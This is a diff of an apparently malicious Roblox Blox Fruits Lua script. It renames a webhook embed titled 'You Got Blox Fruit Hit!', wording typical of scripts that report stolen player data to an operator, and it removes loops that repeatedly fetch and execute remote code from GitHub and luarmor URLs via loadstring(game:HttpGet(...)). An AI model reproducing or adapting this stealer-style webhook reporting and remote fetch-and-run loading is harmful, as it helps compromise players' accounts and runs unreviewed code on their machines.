@@ -68,7 +68,7 @@ end)
 local function sendWebhook()
 
     local embed = {
-        ["title"] = "Dark Scripts - You Got Blox Fruit Hit! :owl:",
+        ["title"] = "REDz Scripts - You Got Blox Fruit Hit! :owl:",
         ["color"] = 39423,
         ["fields"] = {
             {
@@ -759,20 +759,5 @@ local function WaitForPrompt2()
     sendWebhook()
 end
 
-While wait(2) do
-local Settings = {
-  JoinTeam = "Pirates"; -- Pirates/Marines
-  Translator = true; -- true/false
-}
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))(Settings)
-sendWebhook()
-end
-
-while wait(2) do
-
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a5c3af437cd698d64379cf75cacb9281.lua"))()
-
-end
 WaitForPrompt1()
 WaitForPrompt2()
